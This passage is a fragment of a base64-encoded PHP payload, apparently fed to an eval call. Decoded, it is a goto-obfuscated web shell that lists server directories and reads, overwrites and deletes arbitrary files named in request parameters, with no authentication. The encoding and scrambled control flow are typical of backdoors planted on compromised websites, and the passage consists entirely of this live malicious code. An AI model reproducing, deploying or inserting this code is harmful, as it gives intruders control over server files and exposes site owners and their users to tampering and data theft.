lblwiIG5hbWU9XCJwYXRoXCIgdmFsdWU9XCJ7JHBhdGh9XCI+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPVwiRG93bmxvYWRcIj48L2Zvcm0+PC90ZD48L3RyPiI7CmlmIChpc3NldCgkX1BPU1RbImVkaXRfY29udGVudCJdKSkgewogICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWyJmaWxlcGF0aCJdLCBzdHJpcHNsYXNoZXMoJF9QT1NUWyJlZGl0X2NvbnRlbnQiXSkpKSB7CiAgICAgICAgZWNobyAiU2F2ZWQhIjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiTm90IHNhdmVkISI7CiAgICB9Cn0KaWYgKGlzc2V0KCRfR0VUWyJmaWxlcGF0aCJdKSkgewogICAgZ290byBMNUdOeDsKICAgIFJ3V1hYOgogICAgZWNobyAiPC90cj48L3RkPjwvdGFibGU+PGJyIC8+IjsKICAgIGdvdG8gdVNGUmM7CiAgICB1U0ZSYzoKICAgIGVjaG8gIjxmb3JtIGFjdGlvbj1cIlwiIG1ldGhvZD1cInBvc3RcIj48dGV4dGFyZWEgc3R5bGU9XCJ3aWR0aDoxMDAlO2hlaWdodDozMDBweDtcIiBuYW1lPVwiZWRpdF9jb250ZW50XCI+IiAuIGh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJF9HRVRbImZpbGVwYXRoIl0pKSAuICI8L3RleHRhcmVhPjxpbnB1dCB0eXBlPVwic3VibWl0XCI+PC9mb3JtPiI7CiAgICBnb3RvIFR4Q1hHOwogICAgWFl6a0M6CiAgICBlY2hvICRfR0VUWyJmaWxlcGF0aCJdOwogICAgZ290byBSd1dYWDsKICAgIEw1R054OgogICAgZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZpbGUgOiAiOwogICAgZ290byBYWXprQzsKICAgIFR4Q1hHOgp9IGVsc2VpZiAoaXNzZXQoJF9HRVRbImNoZWNrIl0pICYmICRfR0VUWyJjaGVjayJdID09ICIxIikgewogICAgZ290byB1QXBjcjsKICAgIGtmWW5NOgogICAgZWNobyAiPC90cj48L3RkPjwvdGFibGU+PGJyIC8+IjsKICAgIGdvdG8gT1g0SVg7CiAgICBibG9aejoKICAgICRmaWxlbmFtZSA9ICRSb290RGlyIC4gIi9pbmRleC5waHAiOwogICAgZ290byBEVjlrVTsKICAgIE9YNElYOgogICAgZWNobyAiPHByZT4iIC4gaHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKSAuICI8L3ByZT4iOwogICAgZ290byBSS2ZCbjsKICAgIERWOWtVOgogICAgZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZpbGUgOiAiOwogICAgZ290byBOZV9ycDsKICAgIE5lX3JwOgogICAgZWNobyAkZmlsZW5hbWU7CiAgICBnb3RvIGtmWW5NOwogICAgdUFwY3I6CiAgICAkUm9vdERpciA9ICRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl07CiAgICBnb3RvIGJsb1p6OwogICAgUktmQm46Cn0gZWxzZSB7CiAgICBnb3RvIFRNbDA2OwogICAgVE1sMDY6CiAgICBlY2hvICI8L3RhYmxlPjxiciAvPjxjZW50ZXI+IjsKICAgIGdvdG8gUFBrSGs7CiAgICBvT1dmbDoKICAgIGVjaG8gIjwvdGFibGU+PC9kaXY+IjsKICAgIGdvdG8gSFUweDc7CiAgICBVTHpEQjoKICAgIGVjaG8gIjwvY2VudGVyPiI7CiAgICBnb3RvIFZHQVd0OwogICAgR1AzSXI6CiAgICBlY2hvICI8dHIgY2xhc3M9XCJmaXJzdFwiPjx0ZD48L3RkPjx0ZD48L3RkPjx0ZD48L3RkPjx0ZD48L3RkPjwvdHI+IjsKICAgIGdvdG8gZVVJX0w7CiAgICBWR0FXdDoKICAgICRzY2FuZGlyID0gc2NhbmRpcigkcGF0aCk7CiAgICBnb3RvIEJNMEdPOwogICAgZVVJX0w6CiAgICBmb3JlYWNoICgkc2NhbmRpciBhcyAkZmlsZSkgewogICAgICAgIGdvdG8gUkR3Yjk7CiAgICAgICAgRDgyMFU6CiAgICAgICAgZWNobyAiPHRyPjx0ZD48YSBocmVmPVwiP2ZpbGVwYXRoPXskcGF0aH0veyRmaWxlfSZwYXRoPXskcGF0aH1cIj57JGZpbGV9PC9hPjwvdGQ+PHRkPiIgLiAkc2l6ZSAuICI8L3RkPjx0ZD48YSBocmVmPVwiP3BhdGg9eyRwYXRofSZkZWxmaWxlPXskcGF0aH0veyRmaWxlfSZvcHRpb249ZGVsZXRlXCI+RGVsZXRlPC9hPjwvdGQ+PC90cj4iOwogICAgICAgIGdvdG8gdHI5eDg7CiAgICAgICAgUkR3Yjk6CiAgICAgICAgaWYgKCFpc19maWxlKCJ7JHBhdGh9L3skZmlsZX0iKSkgewogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgZ290byBQRHE2MDsKICAgICAgICBQRHE2MDoKICAgICAgICAkc2l6ZSA9IGZpbGVzaXplKCJ7JHBhdGh9L3skZmlsZX0iKSAvIDEwMjQ7CiAgICAgICAgZ290byBQXzR4NDsKICAgICAgICB5dVh2djoKICAgICAgICBpZiAoJHNpemUgPj0gMTAyNCkgewogICAgICAgICAgICAkc2l6ZSA9IHJvdW5kKCRzaXplIC8gMTAyNCwgMikgLiAiIE1CIjsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc2l6ZSA9ICRzaXplIC4gIiBLQiI7CiAgICAgICAgfQogICAgICAgIGdvdG8gRDgyMFU7CiAgICAgICAgUF80eDQ6CiAgICAgICAgJHNpemUgPSByb3VuZCgkc2l6ZSwgMyk7CiAgICAgICAgZ290byB5dVh2djsKICAgICAgICB0cjl4ODoKICAgIH0KICAgIGdvdG8gb09XZmw7CiAgICBRVHZzMToKICAgIGZvcmVhY2ggKCRzY2FuZGlyIGFzICRkaXIpIHsKICAgICAgICBpZiAoIWlzX2RpcigieyRwYXRofS97JGRpcn0iKSB8fCAkZGlyID09ICIuIiB8fCAkZGlyID09ICIuLiIpIHsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGVjaG8gIjx0cj48dGQ+PGEgaHJlZj1cIj9wYXRoPXskcGF0aH0veyRkaXJ9XCI+eyRkaXJ9PC9hPjwvdGQ+PHRkPkRJUjwvdGQ+PHRkPm5vbmU8L3RkPjwvdHI+IjsKICAgIH0KICAgIGdvdG8gR1AzSXI7CiAgICBQUGtIazoKICAgIGlmIChpc3NldCgkX0dFVFsib3B0aW9uIl0pICYmICRfR0VUWyJvcHRpb24iXSA9PSAiZGVsZXRlIikgewogICAgICAgIGlmICh1bmxpbmsoJF9HRVRbImRlbGZpbGUiXSkpIHsKICAgICAgICAgICAgZWNobyAiPGZvbnQgY29sb3I9XCJncmVlblwiPkRlbGV0ZSBGaWxlIERvbmUuPC9mb250PjxiciAvPiI7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobyAiPGZvbnQgY29sb3I9XCJyZWRcIj5EZWxldGUgRmlsZSBFcnJvci48L2ZvbnQ+PGJyIC8+IjsKICAgICAgICB9CiAgICB9CiAgICBnb3RvIFVMekRCOwogICAgQk0wR086CiAgICBlY2hvICI8ZGl2IGlkPVwiY29udGVudFwiPjx0YWJsZSB3aWR0aD1cIjM4MFwiIGJvcmRlcj1cIjBcIiBjZWxscGFkZGluZz1cIjNcIiBjZWxsc3BhY2luZz1cIjFcIiBhbGlnbj1cImNlbnRlclwiPjx0ciBjbGFzcz1cImZpcnN0XCI+PHRkPk5hbWU8L3RkPjx0ZD5TaXplPC90ZD48dGQ+T3B0aW9uczwvdGQ+PC90cj4iOwogICAgZ290byBRVHZzMTsKICAgIEhVMHg3Ogp9'));